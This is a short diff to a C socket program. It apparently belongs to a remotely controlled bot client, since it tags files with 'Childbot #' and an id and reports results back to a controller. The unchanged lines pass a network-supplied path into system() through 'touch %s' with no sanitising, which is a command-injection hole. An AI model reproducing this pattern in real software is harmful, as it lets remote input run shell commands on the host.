@@ -35,6 +35,7 @@ int main(int argc, char **argv)
    char date[255];
    char *temp;
 
+   FILE *fp;
    struct sockaddr_in clientaddr;
    struct utsname buf;
 
@@ -67,6 +68,7 @@ int main(int argc, char **argv)
        if(read(client_sockfd,buf_get,255) <= 0)
        {
            close(client_sockfd);
+           exit(1);
        }
 
        else if(strlen(buf_get) >= 2)
@@ -117,7 +119,16 @@ int main(int argc, char **argv)
                    sprintf(makefile,"touch %s",route);
     
                    if(system(makefile) == 0)
-                       write(client_sockfd,"file creation complete",22);
+                   {
+                       if((fp = fopen(route,"a"))==NULL)
+                       {
+                           write(client_sockfd,"writing file failed",19);
+                           break;
+                       }
+                       fprintf(fp,"Childbot #%c%c\n",id[0],id[1]);
+                       write(client_sockfd,"writing file complete",21);
+                       fclose(fp);
+                   }
                    else
                        write(client_sockfd,"file creation fail",18);
                }
